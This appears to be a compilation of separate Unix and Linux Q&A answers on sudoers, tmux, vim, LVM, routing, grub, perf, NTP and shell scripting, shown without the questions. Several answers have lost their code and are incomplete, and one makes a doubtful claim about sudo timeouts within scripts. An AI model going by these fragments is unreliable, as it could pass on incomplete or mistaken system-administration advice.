you can override the default setting for options such as requiretty for a specific user or for a specific command ( or for a specific run-as-user or host ) , but not for a specific command when executed as a specific user . for example , assuming that requiretty is set in the compile-default options , the following sudoers file allows both artbristol and bob to execute /path/to/program as root from a script . artbristol needs no password whereas bob must have to enter a password ( presumably tty_tickets is off and bob entered his password on some terminal recently ) . artbristol ALL = (root) NOPASSWD: /path/to/program bob ALL = (root) /path/to/program Defaults!/path/to/program !requiretty  if you want to change the setting for a command with specific arguments , you need to use a command alias ( this is a syntax limitation ) . for example , the following fragment allows artbristol to run /path/to/program --option in a script , but not /path/to/program with other arguments .
make an alias like this . then just type shut . alias shut="su -c 'shutdown -h now'"  you need to be root to do it , that is why you first set the user to superuser ( su ) , then issue the command ( -c ) . the -h is for " halt " after shutdown , i.e. , do not reboot ( or do anything else ) .
in order of decreasing speed according to my tests : grep '.\{80\}' file perl -nle 'print if length$_&gt;79' file awk 'length($0)&gt;79' file sed -n '/.\{80\}/p' file 
use : tmux split-window "shell command"  the split-window command has the following syntax :  split-window [-dhvP] [-c start-directory] [-l size | -p percentage] [-t target-pane] [shell-command] [-F format]  ( from man tmux , section " windows and panes" ) . note that the order is important - the command has to come after any of those preceding options that appear , and it has to be a single argument , so you need to quote it if it has spaces . for commands like ping -c that terminate quickly , you can set the remain-on-exit option first : tmux set-option remain-on-exit on tmux split-window 'ping -c 3 127.0.0.1'  the pane will remain open after ping finishes , but be marked " dead " until you close it manually . if you do not want to change the overall options , there is another approach . the command is run with sh -c , and you can exploit that to make the window stay alive at the end : tmux split-window 'ping -c 3 127.0.0.1 ; read'  here you use the shell read command to wait for a user-input newline after the main command has finished . in this case , the command output will remain until you press enter in the pane , and then it will automatically close .
it is possible to have multiple versions of emacs installed on the same machine . only emacs 23 would load files from /usr/share/emacs23/site-lisp/ . all versions of emacs would load files from /usr/share/emacs/site-lisp/ . generally , you just use /usr/share/emacs/site-lisp/ , unless there is some reason the code applies only to a particular version of emacs . to see where your emacs is loading code from , type control + h &nbsp ; &nbsp ; &nbsp ; &nbsp ; v load-path enter .
lvm is designed in a way that keeps it from really getting in the way very much . from the userspace point of view , it looks like another layer of " virtual stuff " on top of the disk , and it seems natural to imagine that all of the i/o has to now pass through this before it gets to or from the real hardware . but it is not like that . the kernel already needs to have a mapping ( or several layers of mapping actually ) which connects high level operations like " write this to a file " to the device drivers which in turn connect to actual blocks on disk . when lvm is in use , that lookup is changed , but that is all . ( since it has to happen anyway , doing it a bit differently is a negligible performance hit . ) when it comes to actually writing the file , the bits take as direct a path to the physical media as they would otherwise . there are cases where lvm can cause performance problems . you want to make sure the lvm blocks are aligned properly with the underlying system , which should happen automatically with modern distributions . and make sure you are not using old kernels subject to bugs like this one . oh , and using lvm snapshots degrades performance . but mostly , the impact should be very small . as for the last : how can you test ? the standard disk benchmarking tool is bonnie++ . make a partition with lvm , test it , wipe that out and ( in the same place , to keep other factors identical ) create a plain filesystem and benchmark again . they should be close to identical .
i was in doubt when you said " svnsync sync accepts no options to specify a login " so i checked the documentation and guess what , it does : --source-password --source-username --sync-password --sync-username  those options should be enough for you to go back to a simple cron script . back into the case where you really can not specify such options , it is still easy to write a wrapper script that sends data to the program 's stdin . for example the following may work ( where program is the program you wan to run , and text is a file where you store text to be sent to the program ) : program &lt; text  however , for authentication , programs are often written to ready from tty and not from stdin ( for security reasons ) . i am not familiar with it , but you can still create a fake terminal in that case . this is where expect comes into use .
i had better responses over on server fault : http://serverfault.com/questions/233036/centos-5-5-install-customization
if you are looking at all the possibilities that can resolve the problem , i suggest the following link which is about how to port gtkparasite to gtk3 . although it is a bit technical , the effort is successful . http://code.google.com/p/gtkparasite/issues/detail?id=18
firstly , according to the file system hierarchy standards , the location of this installed package should be /opt if it is a binary install and /usr/local if it is a from source install . a binary package is going to be easy : sudo tar --directory=/opt -xv f &lt;file&gt;.tar.[bz2|gz] add the directory to your path : export PATH=$PATH:/opt/[package_name]/bin and you are done . a src package is going to be more troublesome ( by far ) : download the package to /usr/local/src tar xf &lt;file&gt;.tar.[bz2|gz] cd &lt;package name&gt; read the README file ( this almost certainly exists ) . most open source projects use autoconf/automake , the instructions should be in the README . probably this step will go : ./configure &amp;&amp; make &amp;&amp; make install ( run the commands separately for sanity if something goes wrong though ) . if there is any problems in the install then you will have to ask specific questions . each package is different . you might have problems of incorrect versions of libraries or missing dependencies . there is a reason that debian packages everything up for you . and there is a reason debian stable runs old packages - finding all the corner cases of installing packages on more than a dozen different architectures and countless different hardware/systems configurations is difficult . when you install something on your own you might run into one of these problems !
this sounds like potentially some arp cache confusion . one possibility is if the " nokia firewall " is part of a high availability ( ha ) pair , there could be some failover or load balancing events occurring . if there is an ha pair and one of them becomes the active firewall , the linux workstation may continue to send requests to the wrong firewall due to the incorrect arp cache entry . you can easily test this next time you lose connectivity to the vpn site . make sure the linux workstation has the iproute package installed . execute ip neigh flush dev eth0 ( substituting the correct interface ) . this will temporarily clear the arp cache until it repopulates , potentially with the hardware address of the firewall that is correctly forwarding traffic . if you can discern which hardware address is forwarding traffic correctly , you can add that as a static arp mapping ( though this could potentially break any ha or load balancing performed by the firewalls ) . ultimately , this should be pointed out to the group responsible for maintaining and configuring the firewalls so it can be resolved .
vGx  enter visual mode , go to end of file , delete . alternatively , you can do : vggx  to delete from the current position to the beginning of the file .
i have since learned of 2 ways to do this : View menu -> Toolbars -> Bookmarks Toolbar right-click on toolbar -> Bookmarks Toolbar
it is a bug in realtek driver . here is how to solve it : https://bugzilla.redhat.com/show_bug.cgi?format=multipleid=797709
the three possibilities that come to mind for me : an alias exists for emacs ( which you have checked ) a function exists for emacs the new emacs binary is not in your shell 's path hashtable . you can check if you have a function emacs: bash-3.2$ declare -F | fgrep emacs declare -f emacs  and remove it : unset -f emacs  your shell also has a path hashtable which contains a reference to each binary in your path . if you add a new binary with the same name as an existing one elsewhere in your path , the shell needs to be informed by updating the hashtable : hash -r  additional explanation : which does not know about functions , as it is not a bash builtin : new binary hashtable behaviour is demonstrated by this script . although i did not call it , which cat would always return the first cat in my path , because it does not use the shell 's hashtable .
hardware failures always run some risk of crashing the kernel since those code paths generally have had much less testing , but normally , a failed hard drive should not crash the kernel . what exactly happens depends on the nature of the failure . perhaps only certain sectors are now unreadable rendering parts of the /home partition unreadable , the system will still be runnable for a sysadmin to analyze the problem . if the root filesystem becomes unusable , the system is pretty much dead regardless of a kernel crash as even a simple shell will not be available . if a swap partition becomes unavailable , programs that are using swap will segment fault when it comes time to read in any swapped out data . if the hard drive that crashed is simply extra storage , it may have little affect besides some filesystems becoming unreadable . it can also depend on what kind of errors the hard drive is throwing . i have seen a drive effectively disappear and besides the file systems disappearing , everything ran ok . i have also seen a hard drive continually hanging the system and throwing errors after a long timeout causing the whole system performance to degrade . if using a layer like md running raid1/4/5 , a severe error will normally just cause the kernel to mark the disk as failed , and it will ignore it relying on the remaining drives to keep the system running .
you can get something along these lines via the thunderbird conversations addon . i have not used it recently but when i did ( a year or two ago ) it was usable , though not quite as smooth as gmail itself . it is being actively developed , so it has likely improved since then . reviews seem to be mostly positive , though it may not work with all versions of tbird .
in bash , i use the following trap command in the last line of my .bashrc to echo all commands to the titlebar . # trap commands and echo them to xterm titlebar. Must be last line. trap 'echo -ne "\033]0;$BASH_COMMAND $USER@${HOSTNAME}&gt;$(pwd)\007"' DEBUG  so if you execute sleep 10 , you will see your titlebar change to sleep 10 for the duration of the command , after which it will change back to user@host&gt;pwd .
look for the file /usr/share/applications/virtualbox.desktop . on my system , it has the following contents : [Desktop Entry] Encoding=UTF-8 Version=1.0 Name=Oracle VM VirtualBox GenericName=Virtual Machine Type=Application Exec=VirtualBox %U ...  simply change the Exec part to point to your custom executable/script . see also thomas nyman 's answer to a similar question .
i do not think this is because of this rule alone , something else is causing this . if i create a .vimrc file with just this rule in it : $ more .vimrc inoremap jk &lt;Esc&gt;  i get the same behavior as expected from both methods . example #1 - esc invoke vim , go into insert mode , right arrow 1 time , hit esc . &nbsp ; &nbsp ; &nbsp ; example #2 - jk invoke vim , go into insert mode , right arrow 1 time , hit jk . &nbsp ; &nbsp ; &nbsp ;
first , `echo $subject` is a convoluted way of writing $subject ( except that it mangles the value a bit more if it contains whitespace or \[*? , because $subject outside quotes is treated as a whitespace-separated list of wildcard patterns , and then the result of the whole command substitution is again treated as a whitespace-separated list of wildcard patterns ) . the only way for your command to result in this error is if `echo $subject` `echo $mailadd` is empty . this happens only when both `echo $subject` and `echo $mailadd` consist only of whitespace , which in turns happens only if both variables subject and mailadd are empty ( plus a few oddball cases , such as subject being the character ? and the current directory containing a file whose name is a single space ) . so most likely you have some blank lines in your input file . you should always put double quotes around variable substitutions and command substitutions ( "$somevar" , "$(somecommand)" ) unless you really mean the values of the variables to be interpreted as whitespace-separated lists of file wildcard patterns . mutt -s "$subject" "$mailaddr" &lt;~/testeomail.txt  if there is a blank line in the input file , skip it .
ok , it seems that i have found the problem . it seems that there must be a mandatory space between the {} and \; , so the command will look like this : find . -perm 755 -exec chmod 644 {} \;  rather than : find . -perm 755 -exec chmod 644 {}\;  also the issue with changing the directory permissions can be solved by adding a -type f flag , so it'll look as follows : find . -type f -perm 755 -exec chmod 644 {} \; 
you are right that you will end up with the same executable at the end ( albeit with a different name ) ; in the first case gcc will actually create a bunch of temporary object files that it removes after linking , versus the second case where you are making the object files yourself . the main reason to do things the second way is to allow for incremental building . after you have compiled your project once , say you change Something.cpp . the only object file affected is something.o -- there is no reason to waste time rebuilding the others . a build system like make would recognize that and only rebuild something.o before linking all the object files together .
this can be done by routing the second vpn over the first . lets say we have a vpn with the gw 192.168.10.1 and a second vpn with the server address 10.10.1.1 than we have to set a route for the second one with route -n add 10.10.1.1 192.168.10.1 ( do not set a setting that sends all traffic over the first vpn ! ) . now we can tell the os with the routing table which vpn to use . let us we want to connect 192.168.3.4 over the first vpn and 10.10.2.2 over the second . we use route -n add 192.168.3.4 192.168.10.1 and route -n add 10.10.2.2 10.10.1.1 etc .
you need both read and execute permissions on a script to be able to execute it . if you can not read the contents of the script , you are not able to execute it either .
the file ~/.bash_profile is read by bash when it is a login shell . that is what you get when you log in in text mode . when you log in under x , the startup scripts are executed by /bin/sh . on ubuntu and mint , /bin/sh is dash , not bash . dash and bash both have the same core features , but dash sticks to these core features in order to be fast and small whereas bash adds a lot of features at the cost of requiring more resources . it is common to use dash for scripts that do not need the extra features and bash for interactive use ( though zsh has a lot of nicer features ) . most combinations of display manager ( the program where you type your user name and password ) and desktop environment read ~/.profile from the login scripts in /etc/X11/Xsession , /usr/bin/lightdm-session , /etc/gdm/Xsession or whichever is applicable . so put your environment variable definitions in ~/.profile . make sure to use only syntax that dash supports . see also difference between login shell and non-login shell ? and alternative to . bashrc .
installing java is easy , just dump the jdk to /usr/local or /opt and then modify your PATH as you said . personally , i would remove the old java path entirely , but that is me . i usually put it in /usr/local and then symlink it to a generic name , like simply jdk or similar , that way when i upgrade it i do not have to change anything that depends on the package . i only need to delete the symlink and recreate it to point to the new version . i suspect you will have other environment variables you will need to modify in order for development to move forward . JAVA_LIB is a common environment variable , which would be set to the lib directory under the jdk , naturally . also , you said in your post " update my path " , did you mean your personal PATH variable or did you mean the system wide settings ? ? i only ask because if you modify your path the developer will not pick up the change in his PATH , if you are using separate logins . as to the question of why anyone would follow that wiki page , i would hope no one would . it is 4 years old and has not been maintained since then according to the page . all that being said , i am sure that java is provided by your package manager ( yum or what have you ) and i would suggest that you go that route and let the system handle the installation for you if it can be done .
i ended up doing this , the other suggestions did not work , as the 2nd command was either killed or never executed .
do not parse the output of ls . the way to list all the files in a directory in the shell is simply * . for f in *; do \u2026  in shells with array support ( bash , ksh , zsh ) , you can directly assign the file list to an array variable : fs=(*) this omits dot files , which goes against your use of ls -A . in bash , set the dotglob option first to include dot files , and set nullglob to have an empty array if the current directory is empty : shopt -s dotglob nullglob fs=(*)  in ksh , use FIGNORE=".?(.)"; fs=(~(N)*) . in zsh , use the D and N glob qualifiers : fs=(*(DN)) . in other shells , this is more difficult ; your best bet is to include each of the patterns * ( non-dot files ) , .[!.]* ( single-dot files , not including . and double-dot files ) and ..?* ( double-dot files , not including .. itself ) , and check each for emptiness . i would better explain what was going wrong in your attempt , too . the main problem is that each side of a pipe runs in a subprocess , so the assignments to fs in the loop are taking place in a subprocess and never passed on to the parent process . ( this is the case in most shells , including bash ; the two exceptions are att ksh and zsh , where the right-hand side of a pipeline runs in the parent shell . ) you can observe this by launching an external subprocess and arranging for it to print its parent 's process id¹´²: in addition , your code had two reliability problems : do not parse the output of ls . read mangles whitespace and backslashes ; to parse lines , you need while IFS= read -r line; do \u2026 for those times when you do need to parse lines and use the result , put the whole data processing in a block . producer \u2026 | { while IFS= read -r line; do \u2026 done consumer }  ¹ note that $$ would not show anything : it is the process id of the main shell process , it does not change in subshells . ² in some bash versions , if you just call sh on a side of the pipe , you might see the same process id , because bash optimizes a call to an external process . the fluff with the braces and echo $? defeat this optimization .
to illustrate ignacio 's answer ( use following protocol : first check if lockfile exists and then install the trap ) , you can solve the problem like this : $ cat test2.sh if [ -f run_script.lck ]; then echo Script $0 already running exit 1 fi trap "rm -f run_script.lck" EXIT # rest of the script ... 
make sure that skype is capitalized . i use className =? "Skype" --&gt; doShift "8" and that works , but if i leave skype in lowercase it does not . i do not use thunderbird , but perhaps it is also a class name issue . it looks like you should be using " thunderbird-bin " . http://ubuntuforums.org/archive/index.php/t-863092.html
select the text to copy and then use the middle mouse button in the other window to paste the selected text . even if no longer selected you can paste last selected string .
Sed: sed -e 'y/ /\\n/' infile  Awk: awk 'BEGIN { OFS = "\\n" } { $1=$1; print }' infile 
if you have ntp reflection enabled your ntp servers might be used as a part of ddos . to make sure ntp reflection is disabled , add this to your ntp.conf: disable monitor  then restart all ntp services . more info on ntp based ddos : http://blog.cloudflare.com/understanding-and-mitigating-ntp-based-ddos-attacks
from wikipedia : as of version 13 , linux mint gives users the choice between cinnamon and mate , as their default desktop environment in the main release edition , with ubuntu as its base . the following ubuntu derived editions are also available : so packages for ubuntu 12.04 ( according to the list of mint releases ) should work .
you should have a /etc/ppp/ip-up.d/0dns-up which will setup dns records , so remove execution bit and use google dns statically . chmod -x /etc/ppp/ip-up.d/0dns-up and modify /etc/resolv . conf to use google dns only ( you have done that already )
 awk -F: '{if (NR&gt;1 &amp;&amp; save!=$1) print "";} {save=$1; print;}'  you never want to insert a blank line before line 1 , so do not even think about it unless NR&gt;1 .   thereafter , print the blank line if the first field is not the saved value from the previous line .
sudo su - ###gets you to /root, as the root user. 
okay , i figured this out . from the man page of fonts-conf , the property weight sets the weight of the bold face , and not the weight of the font . this was why changing weight lead to a bolder boldface rather than change the whole font . what i was looking for was emboldening which enables synthetic font emboldening . using that in ~/.fonts.conf solved the problem . before and after using inconsolata 12 pt . font ( i also disabled font hinting while taking this screenshot ) . it would be nice if the amount of emboldening could also be controlled .
if you have a mount hierarchy like this : /dev/hd1 / /dev/hd2 /a/b/c  and want to change it to /dev/hd1 /dev/hd2 /a  while preserving the structure of the /a directory as seen by applications , and assuming that /a and /a/b are otherwise empty , the transformation is simple : stop the database ( and everything that depends on it ) make sure you have a valid ( restorable ) backup of everything take note of the permissions on directories /a , /a/b and /a/b/c unmount /a/b/c update your fstab ( or whatever your os uses ) to reflect the new layour mount /a then : mkdir -p /a/b/c restore the permissions on those directories as they were before move everything in /a to /a/b/c ( except b you just created obviously ) . example/simulation : $ ls /u001/app/oracle admin/ diag/ product/ ... # umount /u001/app/oracle # &lt;edit fstab&gt; # mount /u001 $ ls /u001 admin/ diag/ product/ ...  at this point , your oracle files are " re-rooted " at /u001 . you just need to move them to the right hierarchy
on linux , gvim == vim -g ; it is the same binary . so , if you have compiled vim with gui support , make install should install consistent versions of both vim and gvim .
a simple solution with some more information : ls -hago | column  also interesting ( but without the links shown ) : this will show all files with human-readable sizes in columns : ls -sh  these commands will do the job : ls -lah | awk '{print $5, $9$10$11}' | column -t | column  or ls -hago --color=no| sed 's/^[^ ][^ ]* *[^ ][^ ]* \( *[^ ][^ ]*\) ............/\1/' | column  with coloring it works too , but doesen't look so ordered : if [ -t 1 ]; then color=yes; else color=no; fi ls -hago --color="$color"| sed 's/^[^ ][^ ]* *[^ ][^ ]* \( *[^ ][^ ]*\) ............/\1/' | column 
i have just tried looking at the link in the thread you pointed to ( btw next time please include such links so that it is easier for others to look at your problem ) and everything is working fine . of course i have not actually bought the tickets but i have got to the screen where the site asks me to pay so i guess that is good enough . i am using chromium . there is a difference that may make things work for you : i use the 32-bit plugin together with nspluginwrapper . there are instructions for fedora .
you should be able to login as root with the password you set up . however , it is quite common not to allow root to log in graphically so this might be what is stopping you . use ctrl alt f2 at the login screen to drop to a tty and log in there . does that work ? if that allows you to log in , create a normal user with adduser and then hit ctrl f8 ( it might be f7 ) to go back to the login screen and try to log in with that user . if this still does not work , you can boot into a live session and create a user from there using chroot . the basic procedure is : boot into a debian ( or whatever ) live session . mount the / partition of your installed system in a temporary location ( i am using dev/sda here , change that with the right device ) : sudo mkdir foo sudo mount /dev/sda1 foo/  chroot into the mounted system , this will create a ' fake ' environment that thinks it is your installed system . sudo chroot foo  at this point , you should be able to create a new user sudo adduser username  reboot into the installed system and try logging in with the user you just created .
evidently , phusion packages their own ubuntu 12.04 vagrant boxes which run the required 3.8 kernel to make it easier to use docker . they also provide the memory and swap accounting kernel init parameters to make these features available to lxc . to use these boxes , simply update the box name and url in your vagrantfile : note that it is still necessary to provision the docker package and repository as above . note also that in order to resolve the hiera warning , a solution can be found in this answer on another question . now it should be extremely easy to start playing around with docker by using vagrant : $ git clone git@github.com:rfkrocktk/docker-vagrant-playground.git $ cd docker-vagrant-playground $ vagrant up $ vagrant ssh  hopefully this helps someone in the future .
q#1: will i only be prompted for a sudo password once , or will i need to enter the sudo password on each invocation of a command inside the script , that needs sudo permission ? yes , once , for the duration of the running of your script . note : when you provide credentials to sudo , the authentication is typically good for 5 minutes within the shell where you typed the password . additionally any child processes that get executed from this shell , or any script that runs in the shell ( your case ) will also run at the elevated level . q#2: is there still a possibility that the sudo permissions will time out ( if , for instance , a particular command takes long enough to exceed the sudo timeout ) ? or will the initial sudo password entrance last for the complete duration of whole script ? no they will not timeout within the script . only if you interactively were typing them within the shell where the credentials were provided . every time sudo is executed within this shell , the timeout is reset . but in your case they credentials will remain so long as the script is executing and running commands from within it . excerpt from sudo man page this limit is policy-specific ; the default password prompt timeout for the sudoers security policy is 5 minutes .
it would help if you were a lot more specific about what you are trying to do . here is an extremely simplistic example : while true do clear date sleep 1 done 
you can run nohup yourprocess &amp; tail -f nohup.out 
you do not have chkconfig in your $path , if you get your root prompt through su , try su - instead . but anyway , export PATH=$PATH:/sbin:/usr/sbin will fix this issue
man mke2fs states valid block-size values are 1024 , 2048 and 4096 bytes per block if we have a look to fs/block_dev.c we could find following : and finally we can determine page_size : # getconf -a| grep PAGE_SIZE PAGE_SIZE 4096 
you can only see the signal strength by adding this line into wvdial.conf : Init4 = AT+CSQ the values are min-max = 0 - 30 . for the type of connection you can only see it by the lights on the device . edit : AT^SYSINFO gives different useful information , among these is the connection type .
assuming none of the file names contain newline characters : find "$PWD" -name __openerp__.py | awk -F/ -vOFS=/ 'NF-=2' | sort -u 
if you want , you can use :set iskeyword-=_  . . . which will mean that underscores are no longer counted as parts of a word ( this does not affect words ) . you can reverse this with : :set iskeyword+=_  these can easily be set to some keybinding : :nnoremap &lt;f2&gt; :set iskeyword-=_ :nnoremap &lt;s-f2&gt; :set iskeyword+=_  someone with a bit with a bit more vimscripting skill than i could probably work out a way to have a toggle button , rather than separate on and off keys .
the problem is that you have a route in your local table that says : $ ip route show table local [...] local 192.168.1.101 dev eth0 scope host [...]  when sending a packet with [ src=192.168.1.101 dst=192.168.1.101 ] , and expecting the router to send that packet back reflected ( some will refuse to this kind of thing ) , you want the outgoing packet to skip that route , but not the packet coming back . for that you can change the ip rules: remove the catch-all rule for the local table . # ip rule del from all table local  and replace it by one that does not do that for the 192.168.1.101-> 192.168.1.101 packets : # ip rule add not from 192.168.1.101 to 192.168.1.101 table local pref 0  then mark the incoming packets with netfilter : # iptables -t mangle -I PREROUTING -s 192.168.1.101 -d 192.168.1.101 -j MARK --set-mark 1  and tell ip rule to use the local table for those only : # ip rule add fwmark 1 table local pref 1  ( of course , you also need your ip route add to 192.168.1.101 via 192.168.1.2 in your main table )
i use runit ' s chpst tool for tasks like this . for example , from the up script call your unprivileged script : chpst -u nobody /path/to/script 
that is not an error . its just a count ( 21 ) of some event . it gave you the normalized value ( 200 ) , but not the threshold , so there is not any way to tell if the hdd vendor considers this too many or not ( but i would guess no , because lower normalized values are bad ) . ' worst ' is misspelled too , makes me think your hard disk checker is seriously lacking in polish . i would suggest using smartctl -A /dev/disk to get full status output , that will include the threshold as well .
sudo accepts command line arguments . so , you can very well go ahead and make changes to sudoers file such that tee is allowed when the argument is /proc/sys/vm/drop_caches for everything else , sudo will deny execution . if you want a tighter execution , drop in a neat and tidy shell script replacement under somewhere in /usr/bin or /usr/local/bin with tighter permissions and then in sudoers configuration , allow users to execute the script as root on that particular host .
it is part of package glibc-utils . if you have a file , but you do not know which package it belongs to , you can find it in two steps : whereis getent getent: /usr/bin/getent opkg search /usr/bin/getent glibc-utils - 2.9-r35.3.5 - /usr/bin/getent  you can not pass use just " opkg search getent " , because it gives empty result . if you do not have the file at all , use http://packages.debian.org angstrom is based on debian , and searching on debian site should give at similar package name . in this case it is libc-bin debian package .
i see three solutions using .last_dir . you can place the echo $PWD &gt; ~/.last_dir either : in a special function that would be a wrapper for cd: function cd_ { [[ -d "$@" ]] || return 1 echo "$@" &gt; ~/.last_dir cd "$@" }  place this in your .bashrc and then use cd_ instead of cd everytime you want your new working directory to be stored . in your $PROMPT_COMMAND ( not recommended ) : PROMPT_COMMAND="$PROMPT_COMMAND; pwd &gt; ~/.last_dir"  you can test this directly from the terminal or place in .bashrc . this solution , however , triggers disk write each time the prompt appears , which might cause trouble - but on the other hand , .last_dir would contain the current directory no matter how you got there . in a custom perl extension script for rxvt . i have never created one myself , but you can find quite a few examples on the web .
the first thing to check in this situation is if the disk you are trying to boot from is the right one . the ordering of disks can depend on many factors : in grub1 , you only get access to two hard disks . this is a limitation of the bios interface . which two hard disks you actually get depends on your bios settings ( look for something like “boot order” ) and what disks and other hard-disk-like bootable media ( e . g . usb flash drives ) you actually have available . under linux , the ordering of sda , sdb , etc . , depends on the order in which drives are detected , which at boot time often depends on the order in which the drivers are loaded . also , whether some disks appear as sd? or hd? depends on kernel configuration options and udev settings . here grub is reporting a partition with type 7 . while linux and grub do not care about partition types ( except for “container” partitions such as extended partitions ) , it is unusual to have a linux filesystem on a partition with type 7 ( which fdisk describes as HPFS/NTFS ) . so my guess is that whichever drive your bios is offering as the second boot drive ( grub 's hd1 ) is not the disk you want to boot , but some other disk with a windows partition . check if hd0 is the drive you want to boot from ; if it is not , you will have to change your bios settings . if grub recognizes the filesystem in a partition , you can type something like cat (hd1,1)/ and press tab to see what files are there . this is the usual way of figuring out what filesystems you have where when you are feeling lost at a grub prompt . the second thing to check would be whether the partition you are trying to access is the right one — grub1 counts from 0 , linux and grub2 count from 1 , and unusual situations ( such as having a bsd installation ) can cause further complications . adding or removing logical partitions can cause existing partitions to be renumbered in a sometimes non-intuitive way . if you had the right partition on the right disk , then Filesystem type unknown would indicate that the partition does not contain a filesystem that your version of grub support . grub1 supports the filesystems commonly used by linux ( ext2 and later versions , reiserfs , xfs , jfs ) but ( unless you have a recent patch ) btrfs . grub1 also does not support lvm , or raid ( except raid-1 , i.e. mirroring , since it looks like an ordinary volume when just reading ) .
answering my own question because i found a way to do this and forgot about this question . what i did : created a file called ssh_login_quote.shin my user 's home folder : #!/bin/bash echo `shuf -n 1 quotes.txt`  ( do not forget to chmod +x ssh_login_quote.sh ) then created a file in the same directory called quotes.txt with one quote per line . in ~/.profile i added ~/./ssh_login_quote.sh to the end of the file . exit and ssh back in ( or reopen your terminal ) and you should see your random quote !
here is mine :
well as jofel commented there is unattended-upgrade to automate the upgrade process , there is also the update-manager-core package that gives you access to the update-manager-text binary . also , the normal package manager will do this quite nicely whenever you ask them ( apt-get upgrade or aptitude full-upgrade ) . this post also suggest that there is no update manager gui for xfce ( i do not use it myself ) so you either will be working with unattended-upgrades or pull update-manager-gnome which as far i see does not have any gnome dependency .
as the wikipedia page says : it is also possible to write to /dev/random . this allows any user to mix random data into the pool . non-random data is harmless , because only a privileged user can issue the ioctl needed to increase the entropy estimate . the current amount of entropy and the size of the linux kernel entropy pool are available in /proc/sys/kernel/random/ , which can be displayed by the command cat /proc/sys/kernel/random/entropy_avail . so , in your case , if you are really intent on injecting some randomness obtained from the raspberrypi as a file , then all you need is to write the file into /dev/random with a simple " cat randomfilefromrasp &gt; /dev/random" . what would be more complex ( and require extra rights ) would be to assert that the extra randomness ensures some given value of extra " entropy " . but it matters only for the irksome blocking mechanism of /dev/random ( this device tends to block when it supposes that it has burnt all its entropy ) ; your extra file still gets added to the mix and will contribute to the actual entropy ( i.e. . you do get the security benefits , even if the kernel does not notice it ) .
after examining your xorg . 0 . log , it appears that xorg is attempting to load the glx module with the nvidia drivers , and since you do not have an nvidia card it is failing to load . removing the nvidia packages should solve your issue : sudo apt-get purge nvidia-common nvidia-settings-319-updates nvidia-319-updates  then restart . in case you are interested , here are the important lines in your Xorg.0.log: this ubuntu forums thread was very useful in figuring this out .
awesome is pretty awesome , so is wmfs2/ratpoison . however you should be able to , modkey = "Control" -- Under the require keys  modkey is used in the default configurations so if you did not stray too far from the defaults this should work like a charm . for three key mapping you could also have the following , awful.key({ modkey, "q" }, "j", function () awful.client.swap.byidx( 1) end),  so inside the {} are the keys your would hold together , and the " j " is the key used to trigger the action respectively . in your case i would have set modkey1 = " q " then replaced the above example with { modkey , modkey1 } good luck with ratpoison : ) kyle
brackets will not expand inside double quotes . try this : for x in *; do rm -r "$x/foo/bar/"{a*,b,c,d,g*}; done 
simple answer : no . if you want lvm you need an initrd . but as others have said before : lvms do not slow your system down or do anything bad in another way , they just allow you to create an environment that allows your kernel to load and do its job . the initrd allows your kernel to be loaded : if your kernel is on an lvm drive the whole lvm environment has to be established before the binary that contains the kernel can be loaded . check out the wikipedia entry on initrd which explains what the initrd does and why you need it . another note : i see your point in wanting to do things yourself but you can get your hands dirty even with genkernel . use genkernel --menuconfig all and you can basically set everything as if you would build your kernel completely without tool support , genkernel just adds the make bzimage , make modules and make modules_install lines for you and does that nasty initrd stuff . you can obviously build the initrd yourself as it is outlined here for initramfs or here for initrd .
there are a few reasons you might want to tar up a bunch of files before transfer : compression : you will get better compression by compressing one large file rather than many small files . at least scp can compress on the fly , but is on a file by file basis . connections : at least with scp , it makes a new connection for each file it transfers . this can greatly slow down the throughput if you are transferring many small files . restart : if your transfer protocol allows restarting a transfer in the middle , it might be easier than figuring out which file was in progress when the transfer was interrupted . permissions : most archiving programs let you retain the ownership and permissions of files , which may not be supported in your transfer program . file location : if the destination location is at the end of a long path , or has not been decided , it might be useful to transfer an archive to the destination and decide latter where the files should go . integrity : its easier to compute and check the checksum for a single archive file than for each file individually .
what you can do with perf without being root depends on the kernel.perf_event_paranoid sysctl setting . kernel.perf_event_paranoid = 2: you can not take any measurements . the perf utility might still be useful to analyse existing records with perf ls , perf report , perf timechart or perf trace . kernel.perf_event_paranoid = 1: you can trace a command with perf stat or perf record , and get kernel profiling data . kernel.perf_event_paranoid = 0: you can trace a command with perf stat or perf record , and get cpu event data . kernel.perf_event_paranoid = -1: you get raw access to kernel tracepoints ( specifically , you can mmap the file created by perf_event_open , i do not know what the implications are ) .
since $GPSDATE is being reported as Sun Aug 8 06:08:11 PKT 2010  the date -s command is doing exactly what you are telling it to do . why is it reporting a wrong year ( or nothing at all ) ? i have no idea . since you are already using ntpd why are you not content to let ntp do its thing ? is this an " i would like gpsdate to work because it is there " issue ? the best way to help us help you debug this it by giving the full output of gpsdate -w  in your question . added in response to gpsdate output : according to the gpsd documentation when the mode field of a tpv record is 1 it means " no fix " . this means that the gps receiver has not seen enough ( or any ) satellite data . this implies that the time value is junk which certainly makes sense if you are seeing a year of 1990 or 2014 . in your script , the sleep 2 gives very little time for gpsd to get a proper gps fix . waiting longer might help , not having a proper antenna attached means you will wait forever for a fix . the network time protocol implemented by ntpd does not need gps to work . it exchanges time synchronization information with other internet hosts , some of which do get their clock from a reference like gps . since your script stops and restarts your ntpd , you could just forget about a gps fix and work with that . for example , the machine i am typing this on uses ntpd and is +4.7 milliseconds off of utc which is more than accurate for many purposes . you can use ntpq -p to find out if and how well your clock is synchronized .
i am going to guess the following all of those tools use xdgutils if you type xdg-open http://google.com it'll open with chromium and that you have the problem described in this ubuntu forumspost so my suggested answer is : $ xdg-mime default firefox.desktop x-scheme-handler/http  ( and ditto for https )
perhaps you should do this in two steps : first : make an lv as raw disk , built a partition table there with entries that correspond to sda1 and sda2 . make these partitions available : kpartx -av /dev/VG/LV use dd ( propably with bs=1m ) to copy sda1 to the first and sda2 to the second " partition " . now you should have a raw-disk-image that corresponds to your physical windows partitions . try to use that lv as disk ( sas , sata or scsi emulation ) . if that works your second step is to convert the lv to a different container format .
kerberos apps also look for dns srv records to find the kdc 's for a given realm . see http://technet.microsoft.com/en-us/library/cc961719.aspx my guess is that winbindd is using ldap as well as kerberos .
